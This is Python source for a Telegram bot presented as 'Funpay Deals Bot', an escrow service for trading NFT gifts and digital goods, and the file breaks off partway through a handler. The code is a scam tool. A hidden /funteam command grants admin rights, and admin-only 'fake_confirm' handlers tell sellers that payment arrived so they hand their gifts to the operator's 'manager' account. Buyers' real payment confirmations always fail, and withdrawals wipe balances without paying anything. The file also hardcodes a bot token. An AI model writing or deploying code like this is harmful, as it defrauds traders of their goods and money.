import asyncio
import logging
import random
import string
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton, FSInputFile, CallbackQuery, InputMediaPhoto

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8997156532:AAEtMHSO6AUSilF9hLBymtgtWEYhbLt-NZk"

# =====================================================
# НАСТРОЙКИ БОТА (ИЗМЕНЯЙТЕ ЗДЕСЬ)
# =====================================================
# Юзернейм менеджера/саппорта (без @)
MANAGER_USER = "FunPayHelpTg"

# Юзернейм аккаунта для отправки подарков (без @)
HELPER_USER = "FunPayHelpTg"

# Ссылка для поддержки
SUPPORT_LINK = f"https://t.me/{MANAGER_USER}"

# =====================================================
# ПУТИ К ФОТО (ПРОВЕРКА СУЩЕСТВОВАНИЯ)
# =====================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

MAIN_PHOTO = os.path.join(BASE_DIR, "main.jpg")
DEAL_PHOTO = os.path.join(BASE_DIR, "main.jpg")
REKV_PHOTO = os.path.join(BASE_DIR, "main.jpg")


# Функция для проверки существования фото
def get_photo(photo_path):
    if os.path.exists(photo_path) and os.path.getsize(photo_path) > 0:
        return FSInputFile(photo_path)
    return None


# =====================================================
# ПРЕМИУМ ЭМОДЗИ ДЛЯ КНОПОК
# =====================================================
EMOJI_IDS = {
    "rekvizity": "5445221832074483553",
    "create_deal": "5458603043203327669",
    "referral": "5271604874419647061",
    "profile": "5461117441612462242",
    "faq": "5436113877181941026",
    "support": "5395695537687123235",
    "language": "5447410659077661506",
    "stroke1": "5312326644764018054",
    "stroke2": "5312419154064607942",
    "stroke3": "5310191758255099001",
    "stroke4": "5312365458383474419",
    "deal_chat": "5325547803936572038",
    "down_menu": "5406745015365943482",
    "balance": "5427168083074628963",
    "nub1": "5382322671679708881",
    "nub2": "5381990043642502553",
    "nub3": "5381879959335738545",
    "nub4": "5382054253403577563",
    "nub5": "5391197405553107640",
    "nub6": "5390966190283694453",
    "flagr": "5449408995691341691",
    "flagr2": "5240228673738527951",
    "flagr3": "5312361253610475399",
    "flagr4": "5445353829304387411",
    "flagr5": "5395695537687123235",
    "flagr6": "5197288647275071607",
    "crystal": "5427168083074628963",
    "rubles": "5377746319601324795",
    "UAH": "5377505475015235101",
    "BYNS": "5199552030615558774",
    "TEN": "5201692367437974073",
    "USD": "5197434882321567830",
    "STR": "5438496463044752972",
    "DEP": "5438496463044752972",
    "WITCHD": "5287231198098117669",
    "dealc": "5267102644886853973",
    "dealty": "5197269100878907942",
    "dealtov": "5444856076954520455",
    "deal": "5305699699204837855",
    "seller": "5312326644764018054",
    "money_home": "5361853256978959774",
    "user_id": "5408916348967348391",
    "dealuid": "5447644880824181073",
    "dealui1": "5409379376506630236",
    "right": "5303530294043753603",
    "confirm": "5395695537687123235",
    "warning": "5395695537687123235",
}


def emoji(key: str, fallback: str = "✨") -> str:
    emoji_id = EMOJI_IDS.get(key)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback


# =====================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

deals = {}
user_cards = {}
user_ton = {}
user_stars = {}
user_balance = {}
user_deals_count = {}
admins = set()


class Form(StatesGroup):
    waiting_for_card = State()
    waiting_for_ton = State()
    waiting_for_star = State()
    waiting_for_currency = State()
    waiting_for_deal_amount = State()
    waiting_for_deal_desc = State()
    waiting_for_withdraw_amount = State()


def generate_deal_code(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


# =====================================================
# КЛАВИАТУРЫ
# =====================================================

def get_profile_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Пополнить",
        callback_data="deposit",
        icon_custom_emoji_id=EMOJI_IDS["DEP"]
    ))
    builder.row(InlineKeyboardButton(
        text="Вывести",
        callback_data="withdraw",
        icon_custom_emoji_id=EMOJI_IDS["WITCHD"]
    ))
    builder.row(InlineKeyboardButton(
        text="Назад В Меню",
        callback_data="back_to_menu",
        icon_custom_emoji_id=EMOJI_IDS["down_menu"]
    ))
    return builder.as_markup()


def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Реквизиты",
        callback_data="manage_details",
        icon_custom_emoji_id=EMOJI_IDS["rekvizity"]
    ))
    builder.add(InlineKeyboardButton(
        text="Создать сделку",
        callback_data="create_deal",
        icon_custom_emoji_id=EMOJI_IDS["create_deal"]
    ))
    builder.row(InlineKeyboardButton(
        text="Рефералы",
        callback_data="referrals",
        icon_custom_emoji_id=EMOJI_IDS["referral"]
    ))
    builder.add(InlineKeyboardButton(
        text="Профиль",
        callback_data="profile",
        icon_custom_emoji_id=EMOJI_IDS["profile"]
    ))
    builder.row(InlineKeyboardButton(
        text="F.A.Q",
        callback_data="FAQ",
        icon_custom_emoji_id=EMOJI_IDS["faq"]
    ))
    builder.add(InlineKeyboardButton(
        text="Язык",
        callback_data="swap_lang",
        icon_custom_emoji_id=EMOJI_IDS["language"]
    ))
    builder.row(InlineKeyboardButton(
        text="Поддержка",
        url=SUPPORT_LINK,
        icon_custom_emoji_id=EMOJI_IDS["support"]
    ))
    return builder.as_markup()


def get_currency_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Крипта",
        callback_data=("set_cur_ton"),
        icon_custom_emoji_id=EMOJI_IDS["crystal"]
    ))
    builder.add(InlineKeyboardButton(
        text="Рубли",
        callback_data=("set_cur_RUB"),
        icon_custom_emoji_id=EMOJI_IDS["rubles"]
    ))
    builder.row(InlineKeyboardButton(
        text="Гривны",
        callback_data=("set_cur_UAH"),
        icon_custom_emoji_id=EMOJI_IDS["UAH"]
    ))
    builder.add(InlineKeyboardButton(
        text="БУНы",
        callback_data=("set_cur_BYN"),
        icon_custom_emoji_id=EMOJI_IDS["BYNS"]
    ))
    builder.row(InlineKeyboardButton(
        text="Tенге",
        callback_data=("set_cur_KZT"),
        icon_custom_emoji_id=EMOJI_IDS["TEN"]
    ))
    builder.add(InlineKeyboardButton(
        text="UsdT",
        callback_data=("set_cur_USD"),
        icon_custom_emoji_id=EMOJI_IDS["USD"]
    ))
    builder.row(InlineKeyboardButton(
        text="Stars",
        callback_data=("set_cur_STR"),
        icon_custom_emoji_id=EMOJI_IDS["STR"]
    ))

    return builder.as_markup()


def get_details_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💎 TON-Кошелек", callback_data="edit_ton"))
    builder.row(InlineKeyboardButton(text="💳 Банковская карта", callback_data="edit_card"))
    builder.row(InlineKeyboardButton(text="⭐ Получатель звезд", callback_data="edit_star"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="back_to_menu"))
    return builder.as_markup()


def get_back_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="back_to_menu"))
    return builder.as_markup()


def get_warning_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="  Продолжить",
        callback_data="continue_create_deal",
        icon_custom_emoji_id=EMOJI_IDS["confirm"]
    ))
    builder.row(InlineKeyboardButton(
        text="Вернуться в меню",
        callback_data="back_to_menu",
        icon_custom_emoji_id=EMOJI_IDS["down_menu"]
    ))
    return builder.as_markup()


# =====================================================
# ОБРАБОТЧИКИ
# =====================================================

@dp.message(Command("funteam"))
async def admin_command(message: types.Message):
    admins.add(message.from_user.id)
    await message.answer("✅ <b>Вы успешно получили права администратора!</b>", parse_mode="HTML")


@dp.message(Command("set_deals"))
async def set_deals_command(message: types.Message, command: CommandObject):
    if message.from_user.id not in admins:
        await message.answer("❌ У вас нет прав для выполнения этой команды.")
        return
    args = command.args
    if not args:
        await message.answer("📝 Использование: /set_deals <количество>")
        return
    try:
        count = int(args)
        if count < 0:
            await message.answer("❌ Количество не может быть отрицательным.")
            return
        user_deals_count[message.from_user.id] = count
        await message.answer(f"✅ Количество завершенных сделок установлено на {count}.")
    except ValueError:
        await message.answer("❌ Введите корректное число.")


@dp.callback_query(F.data == "profile")
async def profile_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    deals_count = user_deals_count.get(user_id, 0)
    text = (
        f"{emoji('profile', '👤')} <b>Ваш профиль</b>\n\n"
        f"{emoji('balance', '💰')} Баланс: <b>{balance:.2f} RUB</b>\n"
        f"📊 Завершенных сделок: <b>{deals_count}</b>\n\n"
        f"<i>Для пополнения баланса обратитесь в поддержку</i>"
    )
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_profile_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_profile_menu(), parse_mode="HTML")


@dp.callback_query(F.data == "deposit_balance")
async def deposit_balance(callback: types.CallbackQuery):
    text = (
        "🏦 <b>Пополнение баланса</b>\n\n"
        f"Для пополнения баланса обратитесь в службу поддержки:\n"
        f"@{MANAGER_USER}\n\n"
        "Укажите сумму пополнения и способ оплаты."
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Написать в поддержку",
        url=SUPPORT_LINK,
        icon_custom_emoji_id=EMOJI_IDS["support"]
    ))
    builder.row(InlineKeyboardButton(
        text="↩️ Вернуться в профиль",
        callback_data="profile"
    ))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data == "withdraw_balance")
async def withdraw_balance(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    deals_count = user_deals_count.get(user_id, 0)

    if balance < 1000:
        text = (
            "❌ <b>Недостаточно средств для вывода</b>\n\n"
            f"Текущий баланс: {balance:.2f} RUB\n"
            f"Минимальная сумма для вывода: 1000 RUB\n\n"
            "Пополните баланс для совершения вывода."
        )
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="deposit_balance"))
        builder.row(InlineKeyboardButton(text="↩️ Вернуться в профиль", callback_data="profile"))
        photo = get_photo(MAIN_PHOTO)
        if photo:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        return

    if deals_count < 2:
        text = (
            "❌ <b>Недостаточно сделок для вывода</b>\n\n"
            f"Количество завершенных сделок: {deals_count}\n"
            f"Необходимо минимум: 2 сделки\n\n"
            "Выполните больше сделок для получения возможности вывода."
        )
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="↩️ Вернуться в профиль", callback_data="profile"))
        photo = get_photo(MAIN_PHOTO)
        if photo:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        return

    text = (
        "💸 <b>Вывод средств</b>\n\n"
        f"Доступно для вывода: {balance:.2f} RUB\n"
        f"Количество сделок: {deals_count}\n\n"
        "Средства будут переведены на ваши реквизиты в течение 24-48 часов.\n"
        "С вами свяжется администратор для подтверждения."
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="✅ Подтвердить вывод", callback_data="confirm_withdraw"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в профиль", callback_data="profile"))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data == "confirm_withdraw")
async def confirm_withdraw(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    balance = user_balance.get(user_id, 0)
    user_balance[user_id] = 0

    text = (
        "✅ <b>Заявка на вывод отправлена!</b>\n\n"
        f"Сумма: {balance:.2f} RUB\n"
        "Ожидайте подтверждения от администратора.\n\n"
        "Средства будут переведены в течение 24-48 часов."
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="back_to_menu"))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")

    for admin_id in admins:
        try:
            await bot.send_message(
                admin_id,
                f"🔔 <b>Новая заявка на вывод</b>\n\n"
                f"Пользователь: @{callback.from_user.username or 'Неизвестно'}\n"
                f"Сумма: {balance:.2f} RUB\n"
                f"ID: {user_id}",
                parse_mode="HTML"
            )
        except:
            pass


@dp.callback_query(F.data == "referrals")
async def referrals_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    bot_info = await bot.get_me()
    ref_code = f"ref_{user_id}_{random.randint(1000, 9999)}"
    ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"

    text = (
        f"{emoji('referral', '🤝')} <b>Реферальная программа</b>\n\n"
        "Приглашайте друзей и получайте бонусы!\n\n"
        "🔗 Ваша реферальная ссылка:\n"
        f"<code>{ref_link}</code>\n\n"
        "📊 Статистика:\n"
        "Приглашено друзей: 0\n"
        "Заработано бонусов: 0 RUB\n\n"
        "💡 За каждого приглашенного друга, который совершит первую сделку, вы получите бонус 50 RUB!"
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref_link"))
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="back_to_menu"))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data == "copy_ref_link")
async def copy_ref_link(callback: types.CallbackQuery):
    await callback.answer("📋 Ссылка скопирована!", show_alert=True)


@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext, command: CommandObject = None):
    await state.clear()
    args = command.args if command else None

    if args and args.startswith("ref_"):
        parts = args.split("_")
        if len(parts) == 3 and parts[1].isdigit():
            referrer_id = int(parts[1])
            if referrer_id != message.from_user.id:
                user_balance[referrer_id] = user_balance.get(referrer_id, 0) + 50
                await bot.send_message(
                    referrer_id,
                    f"🎉 <b>Новый реферал!</b>\n\n"
                    f"Пользователь @{message.from_user.username or 'Неизвестно'} зарегистрировался по вашей ссылке.\n"
                    f"Начислен бонус: 50 RUB\n"
                    f"Ваш баланс: {user_balance.get(referrer_id, 0):.2f} RUB",
                    parse_mode="HTML"
                )

    if args and args in deals:
        deal = deals[args]
        deal_id = args

        if message.from_user.id == deal['creator_id']:
            text = "❌ Вы не можете войти в собственную сделку."
            photo = get_photo(MAIN_PHOTO)
            if photo:
                await message.answer_photo(photo=photo, caption=text, reply_markup=get_main_menu(), parse_mode="HTML")
            else:
                await message.answer(text=text, reply_markup=get_main_menu(), parse_mode="HTML")
            return

        buyer_username = message.from_user.username or message.from_user.first_name
        try:
            creator_text = (
                f"{emoji('user_id', '👤')} Новый участник в сделке<b> #{deal_id}</b>\n\n"
                f"Пользователь: @{buyer_username} присоединился к сделке.\n\n"
                f"{emoji('dealui1', '👤')} Успешных сделки: {user_deals_count.get(deal['creator_id'], 0)}\n\n "
                f"{emoji('dealuid', '👤')} Внимание:\n"
                f"• Убедитесь, что это именно тот пользователь, с которым вы ранее вели переговоры.\n"
                f"• Не отправляйте подарок до подтверждения оплаты в этом чате!\n"
                f"• Подарок строго отправляется на аккаунт @{HELPER_USER}. В случае если вы отправите подарок напрямую — вернуть подарок будет невозможно."
            )
            await bot.send_message(deal['creator_id'], creator_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Ошибка уведомления продавца: {e}")

        if deal['currency'] == "TON":
            seller_details = user_ton.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")
        elif deal['currency'] == "STR":
            seller_details = user_stars.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")
        else:
            seller_details = user_cards.get(deal['creator_id'], "Не указаны (обратитесь к продавцу)")

        currency_symbols = {
            "RUB": "RUB 🇷🇺", "KZT": "KZT 🇰🇿", "UAH": "UAH 🇺🇦",
            "BYN": "BYN 🇧🇾", "EUR": "EUR 🇪🇺", "USD": "USD 🇺🇸",
            "STR": "Stars ⭐", "TON": "TON 💎", "CNY": "CNY 🇨🇳"
        }

        text = (
            f"{emoji('rekvizity', '👤')} <b>Информация о сделке #{deal_id}</b>\n\n"
            f"{emoji('profile', '👤')} Вы покупатель в сделке.\n"
            f"{emoji('seller', '👤')}Продавец: @{deal['creator_username']}\n"
            f"• Успешные сделки: {user_deals_count.get(deal['creator_id'], 0)}\n\n"
            f"• Вы покупаете: <b>{deal['description']}</b>\n\n"
            f"{emoji('money_home', '👤')}<b>Реквизиты для оплаты:</b>\n"
            f"<code>{seller_details}</code>\n\n"
            f"{emoji('balance', '👤')} <b>Сумма к оплате:</b> {deal['amount']} {currency_symbols.get(deal['currency'], deal['currency'])}\n"
            f"{emoji('dealtov', '👤')}d <b>Комментарий к платежу:</b> <code>{deal_id}</code>\n\n"
            f"{emoji('support', '👤')} Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий обязателен!\n\n"
            f"В случае если вы отправили транзакцию без комментария, напишите менеджеру - @{MANAGER_USER}"
        )

        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay_{deal_id}"))
        builder.row(InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="back_to_menu"))
        photo = get_photo(MAIN_PHOTO)
        if photo:
            await message.answer_photo(photo=photo, caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        else:
            await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        return

    text = (
        f"{emoji('deal_chat', '✨')} <b>Добро пожаловать в Funpay Deals Bot! - ваш надежный сервис для безопасных и удобных сделок</b> {emoji('deal_chat', '✨')}\n\n"
        f"{emoji('stroke1', '🛡️')} Автоматизированные сделки\n"
        f"{emoji('stroke2', '🤝')} Реферальная система\n"
        f"{emoji('stroke3', '👛')} Вывод средств в любой валюте\n"
        f"{emoji('stroke4', '📞')} Поддержка 24/7\n\n"
        f"⚡ Автоматизированно, быстро и без лишних хлопот!\n\n"
        f"{emoji('down_menu', '⬇️')} Выберите нужный раздел ниже!"
    )
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await message.answer_photo(photo=photo, caption=text, reply_markup=get_main_menu(), parse_mode="HTML")
    else:
        await message.answer(text=text, reply_markup=get_main_menu(), parse_mode="HTML")


@dp.callback_query(F.data == "FAQ")
async def faq_callback(callback: types.CallbackQuery):
    text = (
        f"{emoji('flagr', '📞')}{emoji('faq', '❓')} F.A.Q — Часто задаваемые вопросы\n\n"
        f"{emoji('nub1', '📞')} Что делает бот?\n"
        f"🤖 Бот выступает автоматическим гарантом сделок: он обеспечивает безопасный обмен NFT-подарками, Telegram-каналами, чатами, кодами для ботов и другими цифровыми товарами.\n\n"
        f"{emoji('nub2', '📞')} Что можно купить или продать?\n"
        f"{emoji('flagr2', '📞')} Практически всё — от цифровых активов до кодов, подписок и Telegram-ресурсов.\n\n"
        f"{emoji('nub3', '📞')} Как проходит сделка?\n"
        f"{emoji('flagr3', '📞')} Все сделки автоматизированы: бот фиксирует товар и оплату, а после подтверждения переводит средства и активы.\n\n"
        f"{emoji('nub4', '📞')} Как выводить средства?\n"
        f"{emoji('flagr4', '📞')} Вывод доступен в любой удобной валюте\n\n"
        f"{emoji('nub5', '📞')} Есть ли поддержка?\n"
        f"{emoji('support', '📞')} Да! Поддержка работает 24/7\n\n"
        f"{emoji('nub6', '📞')} Безопасно ли это?\n"
        f"{emoji('flagr6', '📞')} Да, бот использует автоматизированный гарант, что исключает риск обмана"
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Написать в поддержку",
        url=SUPPORT_LINK,
        icon_custom_emoji_id=EMOJI_IDS["support"]
    ))
    builder.row(InlineKeyboardButton(
        text="↩️ Вернуться в меню",
        callback_data="back_to_menu"
    ))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data == "deal_history")
async def deal_history_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    deals_count = user_deals_count.get(user_id, 0)
    text = (
        f"📜 <b>История сделок</b>\n\n"
        f"Всего завершенных сделок: {deals_count}\n\n"
    )
    if deals_count > 0:
        text += "✅ У вас есть завершенные сделки.\nПодробная история будет доступна в ближайшее время."
    else:
        text += "❌ У вас пока нет завершенных сделок.\n\nСоздайте первую сделку и начните зарабатывать!"
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="↩️ Вернуться в меню", callback_data="back_to_menu"))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=builder.as_markup()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")


@dp.message(Command("buy"))
async def buy_fake_command(message: types.Message, command: CommandObject):
    if message.from_user.id not in admins:
        return
    args = command.args
    if not args:
        await message.answer("Пожалуйста, укажите код сделки после команды /buy например #KUA0G7RG")
        return
    deal_id = args.replace("#", "")
    if deal_id not in deals:
        await message.answer("❌ Сделка с таким кодом не найдена.")
        return
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"fake_confirm_{deal_id}"))
    await message.answer("Нажмите кнопку ниже для подтверждения оплаты", reply_markup=builder.as_markup())


@dp.callback_query(F.data.startswith("fake_confirm_"))
async def process_fake_confirm(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]
    deal['buyer_id'] = callback.from_user.id

    cur_sym = {
        "RUB": "RUB 🇷🇺", "KZT": "KZT 🇰🇿", "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾", "EUR": "EUR 🇪🇺", "USD": "USD 🇺🇸",
        "STR": "Stars ⭐", "TON": "TON 💎", "CNY": "CNY 🇨🇳"
    }.get(deal['currency'], "RUB")

    seller_text = (
        f"✅ <b>Оплата подтверждена для сделки #{deal_id}</b>\n"
        f"Сумма: {deal['amount']} {cur_sym}\n"
        f"Описание: {deal['description']}\n\n"
        f"Пожалуйста отправьте подарок менеджеру: @{MANAGER_USER}\n"
        f"⚠️ После отправки подарка нажмите кнопку ниже:"
    )
    builder_seller = InlineKeyboardBuilder()
    builder_seller.row(InlineKeyboardButton(text="🎁 Я отправил подарок", callback_data=f"gift_sent_{deal_id}"))

    try:
        await bot.send_message(deal['creator_id'], seller_text, reply_markup=builder_seller.as_markup(),
                               parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error notifying seller: {e}")

    buyer_text = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"Сделка: #{deal_id}\n"
        f"Продавец: @{deal['creator_username']}\n"
        f"Сумма: {deal['amount']} {cur_sym}\n"
        f"Описание: {deal['description']}\n\n"
        f"Ожидайте, продавец отправит подарок менеджеру @{MANAGER_USER} для проверки\n"
        f"Ожидайте уведомления о передаче подарка"
    )
    await callback.message.edit_text(buyer_text, parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("gift_sent_"))
async def process_gift_sent(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]
    await callback.message.answer("✅ Запрос на подтверждение отправлен покупателю!")

    buyer_text = (
        f"🔔 <b>Продавец утверждает, что отправил товар</b>\n\n"
        f"Сделка: #{deal_id}\n"
        f"Продавец: @{deal['creator_username']}\n"
        f"Сумма: {deal['amount']} RUB\n"
        f"Описание: {deal['description']}\n\n"
        f"Подтвердите получение товара:"
    )
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="✅ Подтвердить получение", callback_data=f"deal_finish_{deal_id}"))
    builder.row(InlineKeyboardButton(text="❌ Не получил товар", callback_data="not_received"))

    try:
        await bot.send_message(deal['buyer_id'], buyer_text, reply_markup=builder.as_markup(), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error notifying buyer: {e}")
    await callback.answer()


@dp.callback_query(F.data == "not_received")
async def process_not_received(callback: CallbackQuery):
    await callback.answer("Уведомление отправлено поддержке.", show_alert=True)


@dp.callback_query(F.data.startswith("deal_finish_"))
async def process_deal_finish(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]

    seller_id = deal['creator_id']
    amount = float(deal['amount'])
    commission = amount * 0.01
    amount_to_add = amount - commission

    user_balance[seller_id] = user_balance.get(seller_id, 0) + amount_to_add
    user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1

    buyer_id = deal.get('buyer_id')
    if buyer_id:
        bonus = amount * 0.002
        user_balance[buyer_id] = user_balance.get(buyer_id, 0) + bonus
        user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1

    cur_sym = "RUB" if deal['currency'] == "RUB" else "Stars ⭐" if deal['currency'] == "STR" else deal['currency']

    finish_text = (
        f"✅ <b>Сделка успешно завершена!</b>\n\n"
        f"Сделка #{deal_id}\n"
        f"Сумма: {amount} {cur_sym}\n"
        f"Комиссия (1%): {commission:.2f} {cur_sym}\n"
        f"Начислено продавцу: {amount_to_add:.2f} {cur_sym}\n"
        f"Новый баланс: {user_balance.get(seller_id, 0):.2f} RUB\n"
        f"Завершенных сделок: {user_deals_count.get(seller_id, 0)}"
    )
    await callback.message.edit_text(finish_text, parse_mode="HTML")

    try:
        await bot.send_message(seller_id, finish_text, parse_mode="HTML")
    except:
        pass

    if buyer_id:
        buyer_text = (
            f"✅ <b>Сделка #{deal_id} завершена!</b>\n\n"
            f"Вам начислен бонус: {bonus:.2f} RUB\n"
            f"Всего сделок: {user_deals_count.get(buyer_id, 0)}"
        )
        try:
            await bot.send_message(buyer_id, buyer_text, parse_mode="HTML")
        except:
            pass

    del deals[deal_id]


@dp.callback_query(F.data.startswith("confirm_pay_"))
async def process_confirm_payment(callback: CallbackQuery):
    await callback.answer(
        text="💔 К сожалению произошла ошибка, попробуйте позже",
        show_alert=True
    )


@dp.callback_query(F.data == "manage_details")
async def manage_details(callback: types.CallbackQuery):
    text = f"{emoji('rekvizity', '⚙️')} <b>Управление реквизитами</b>\n\nВыберите тип реквизитов для редактирования:"
    photo = get_photo(REKV_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_details_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_details_menu(), parse_mode="HTML")


@dp.callback_query(F.data == "edit_card")
async def edit_card_btn(callback: types.CallbackQuery, state: FSMContext):
    text = "💳 <b>Добавьте реквизиты вашей карты:</b>\n\nОтправьте реквизиты в формате:\n<code>Банк - Номер карты</code>"
    photo = get_photo(REKV_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_back_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(), parse_mode="HTML")
    await state.set_state(Form.waiting_for_card)


@dp.callback_query(F.data == "edit_ton")
async def edit_ton_btn(callback: types.CallbackQuery, state: FSMContext):
    text = "🔑 <b>Добавьте ваш TON-кошелек:</b>\n\nПожалуйста, отправьте адрес вашего TON-кошелька."
    photo = get_photo(REKV_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_back_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(), parse_mode="HTML")
    await state.set_state(Form.waiting_for_ton)


@dp.callback_query(F.data == "edit_star")
async def edit_star_btn(callback: types.CallbackQuery, state: FSMContext):
    text = "⭐ <b>Введите @username для получения звезд:</b>\n\nФормат: @username"
    photo = get_photo(REKV_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_back_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(), parse_mode="HTML")
    await state.set_state(Form.waiting_for_star)


@dp.message(Form.waiting_for_card)
async def card_received(message: types.Message, state: FSMContext):
    user_cards[message.from_user.id] = message.text
    await message.answer(f"✅ Реквизиты карты сохранены:\n<code>{message.text}</code>", parse_mode="HTML")
    await start_command(message, state)


@dp.message(Form.waiting_for_ton)
